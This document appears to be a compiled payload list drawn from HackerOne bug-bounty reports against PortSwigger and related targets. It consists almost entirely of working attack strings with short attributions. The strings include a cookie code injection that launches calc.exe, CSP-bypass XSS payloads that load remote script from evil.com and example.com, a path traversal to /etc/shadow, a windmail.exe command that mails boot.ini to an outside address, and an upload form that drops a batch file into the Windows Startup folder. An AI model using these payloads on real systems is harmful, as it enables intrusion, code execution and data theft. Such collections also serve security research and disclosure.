# PortSwigger Web Security

8 payloads.

### `c5febaa3`

```
GET /redirect.php?url=http://evil.com HTTP/1.1
Host: example.com
```

**Parameter:** `url`
— [Leak of Platform Authentication credentials via Repeater](https://hackerone.com/reports/302651) · PortSwigger Web Security · [jupenur](https://hackerone.com/jupenur) · $200.0

### `628f3fde`

```
document.cookie = "test='/require('child_process').exec('calc.exe')//"
```

**Parameter:** `cookie`
— [RCE in 'Copy as Node Request' BApp via code injection](https://hackerone.com/reports/1167530) · PortSwigger Web Security · [ryotak](https://hackerone.com/ryotak)

### `65486647`

```
<script src='https://target.com/recaptcha/about/js/main.min.js'></script>
<img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>
```

— [CSP bypass on target.com using Google script resources](https://hackerone.com/reports/2279346) · PortSwigger Web Security · [joaxcar](https://hackerone.com/joaxcar) · $1,500.0

### `5bbd0c2f`

```
<img src=x ng-on-error='
w=$event.target.ownerDocument;
a=w.defaultView.top.document.querySelector("[nonce]");
b=w.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce;
w.body.appendChild(b)
'>
```

— [CSP bypass on target.com using Google script resources](https://hackerone.com/reports/2279346) · PortSwigger Web Security · [joaxcar](https://hackerone.com/joaxcar) · $1,500.0

### `e330922e`

```
document.getElementsByTagName("div")[0].innerHTML=`<iframe srcdoc="<div lang=en ng-app=application ng-csp class=ng-scope>
<script src='https://target.com/recaptcha/about/js/main.min.js'></script>
<img src=x ng-on-error='w=$event.target.ownerDocument;a=w.defaultView.top.document.querySelector(&quot;[nonce]&quot;);b=w.createElement(&quot;script&quot;);b.src=&quot;//evil.com/hack.js&quot;;b.nonce=a.nonce;w.body.appendChild(b)'>
</div>
">`
```

— [CSP bypass on target.com using Google script resources](https://hackerone.com/reports/2279346) · PortSwigger Web Security · [joaxcar](https://hackerone.com/joaxcar) · $1,500.0

### `27332459`

```
https://target.com/cms/audioitems//etc/shadow
```

— [\[target.com\] Path Traversal al /cms/audioitems](https://hackerone.com/reports/2424815) · PortSwigger Web Security · [0xd0m7](https://hackerone.com/0xd0m7)

### `3341005e`

```
WINDMAIL.EXE?%20-n%20c:\boot.ini%20Hacker@hax0r.com%20|%20dir%20c:\\
```

**Parameter:** `url`
— [cgi scripts wordlist entry for windmail.exe has payload that sends arbitrary file read result to third-party](https://hackerone.com/reports/2733994) · PortSwigger Web Security · [floyd](https://hackerone.com/floyd) · $200.0

### `86ed6b35`

```
<!doctype html>
<html>
  <body>
    <form action="/upload" method="post" enctype="multipart/form-data">
      <input
        type="file"
        name="upload"
        value="calc.exe"
        accept="./../../../../Roaming/Microsoft/Windows/Start Menu/Programs/Startup/burp_calc.bat">
      <button type="submit">Upload</button>
    </form>
  </body>
</html>
```

— [Burp Suite Professional: browser-powered crawl can write attacker-controlled files through file input handling](https://hackerone.com/reports/3712279) · PortSwigger Web Security · [kawakatz](https://hackerone.com/kawakatz) · $5,000.0
